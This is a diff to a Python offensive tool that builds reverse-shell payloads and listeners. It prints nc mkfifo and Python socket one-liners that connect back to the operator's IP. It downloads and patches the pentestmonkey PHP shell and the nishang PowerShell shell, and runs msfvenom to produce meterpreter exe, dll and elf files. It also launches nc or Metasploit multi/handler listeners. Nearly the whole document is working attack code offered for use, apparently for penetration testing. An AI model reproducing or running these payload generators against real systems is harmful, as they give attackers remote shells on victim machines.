@@ -9,11 +9,19 @@ ap.add_argument('-I', '--interface', required=True, type=str, help='Select the n
 
 ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')
 
-ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1 or python).')
+ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf or python).')
 
-ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (nc, msf).')
+ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (meterpreter): nc or msf (msf only works with .exe, .dll and .elf payloads).')
+
+ap.add_argument('-a', '--architecture', required=False, type=str, help='Define the architecture of the machine: x64 or x86 (default value is x64).')
 
 args = ap.parse_args()
+
+ActualPath = os.popen('pwd').read().replace('\n', '')
+
+payload = args.payload.lower()
+
+arch = args.architecture.lower()
 
 try:
     int(args.port)
@@ -24,41 +32,51 @@ except:
 def Get_IP(NT = args.interface):
     return os.popen("ifconfig " + str(NT) + " | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')
 
-def nc_list(port = args.port, payload = args.payload):
-    if args.payload == 'exe' or args.payload == '.exe' or args.payload == 'dll' or args.payload == '.dll':
+def nc_list(port = args.port, payload = payload):
+    if payload == 'exe' or payload == '.exe' or payload == 'dll' or payload == '.dll':
         os.system('rlwrap nc -lvnp ' + str(port))
     else:
         os.system('nc -lvnp ' + str(port))
 
-def msf_list(port = args.port, IP = Get_IP(), PORT = args.port):
-    print(blue('Creating your listener on metasploit.\n'))
+def msf_list(IP = Get_IP(), PORT = args.port):
+    print(blue('Setting up your listener on metasploit.\n'))
     print(green('Waiting to say I\'m in...\n'))
-    os.system('msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + '; exploit" 2>/dev/null')
+    print(arch)
+    command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + '; exploit" 2>/dev/null'
+    if arch == 'x86' or arch == '86':
+        command = command.replace('x64', 'x86')
+    if payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll':
+        os.system(command)
+    else:
+        os.system(command.replace('windows', 'linux'))
 
-def Check_files():
+def message(file, ActualPath = ActualPath):
+    print(blue(('Your payload ' + red(file) + blue(' is located in ') +  red(ActualPath) + blue(' and ready to upload.\n'))))
+
+def Check_files(file):
     path = '/opt/autoreverse/'
-    cppath = path
-    files = {
-        'autoreverse.php': 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php', 
+    if os.path.exists(path) == False:
+        os.system('mkdir ' + path)
+    filelink = {
+        'autoreverse.php': 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php',
         'autoreverse.ps1': 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'
     }
-    os.system('mkdir ' + path + ' 2>/dev/null')
-    for k,v in files.items():
-        cppath += k
-        if os.path.exists(cppath) == False:
-            print('Downloading ' + blue(k) + ' on ' + path + '\n')
-            os.system('wget ' + v + ' -O ' + path + k + ' 2>/dev/null')
-            print(blue(k) + green(' downloaded.\n'))
-        cppath = path
+    if os.path.exists(path + file) == False:
+        print('\nDownloading ' + blue(file) + ' in ' + path + '\n')
+        os.system('wget ' + filelink[file] + ' -O ' + path + file + ' 2>/dev/null')
+        print(blue(file) + green(' downloaded.\n'))
 
-def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf = False, sys='64'):
+def Configure(IP = Get_IP(), PORT = str(args.port), payload = payload, msf = False, sys='64'):
     if payload.isnumeric():
         print(red('The payload must be a string.'))
         exit()
+    
     msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + str(IP) + ' LPORT=' + str(PORT) + ' -f exe > autoreverse.exe 2>/dev/null'
-    payload = payload.lower()
+
     if msf == True:
         msfvenom = msfvenom.replace('shell_', 'meterpreter/')
+    if sys == 'x86' or sys == '86':
+        msfvenom = msfvenom.replace('x64', 'x86')
 
     if payload == 'oldnc':
         print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f\n'))
@@ -69,29 +87,38 @@ def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf 
     elif payload == 'python' or payload == '.py':
         print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"))
     elif payload == 'php' or payload == '.php':
-        Check_files()
+        file = 'autoreverse.php'
+        Check_files(file)
         os.system('cp /opt/autoreverse/autoreverse.php .')
-        with open('autoreverse.php', 'r') as file:
-            data = file.readlines()
-        with open('autoreverse.php', 'w') as file:
+        with open('autoreverse.php', 'r') as archivo:
+            data = archivo.readlines()
+        with open('autoreverse.php', 'w') as archivo:
             data[48] = "$ip = '" + IP + "';\n"
             data[49] = "$port = " + PORT + ";\n"
-            file.writelines(data)
-        print(blue(('Your payload ' + red('autoreverse.php') + blue(' is located in ') + red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
+            archivo.writelines(data)
+        message(file)
+    elif payload == 'elf' or payload == '.elf':
+        file = 'autoreverse.elf'
+        print(blue('Creating the payload, please wait.\n'))
+        msfvenom = msfvenom.replace('windows', 'linux').replace('exe', 'elf')
+        os.system(msfvenom)
+        message(file)
     elif payload == 'powershell' or payload == 'ps1' or payload == '.ps1':
-        Check_files()
+        file = 'autoreverse.ps1'
+        Check_files(file)
         os.system('cp /opt/autoreverse/autoreverse.ps1 .')
         os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
-        print(blue(('Your payload ' + red('autoreverse.ps1') + blue(' is located in ') + red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
-
+        message(file)
     elif payload == 'exe' or payload == '.exe':
+        file = 'autoreverse.exe'
         print(blue('Creating the payload, please wait.\n'))
         os.system(msfvenom)
-        print(blue(('Your payload ' + red('autoreverse.exe') + blue(' is located in ') +  red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
+        message(file)
     elif payload == 'dll' or payload == '.dll':
+        file = 'autoreverse.dll'
         print(blue('Creating the payload, please wait.\n'))
         os.system(msfvenom.replace('exe', 'dll'))
-        print(blue(('Your payload ' + red('autoreverse.dll') + blue(' is located in ') +  red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
+        message(file)
     else:
         print(red('You payload option is not in the list, use "--help" to know the payloads list.'))
         exit()
@@ -110,9 +137,11 @@ if args.listener != None:
         Configure(msf = True)
         msf_list()
         exit()
+    else:
+        print(red('Your listener option is not in the list, use "--help" to know the listeners list.'))
+        exit()
 
 if os.path.exists('/usr/local/bin/autoreverse.py') == False:
-    ActualPath = os.popen('pwd').read().replace('\n', '')
     os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')
 
 Configure()
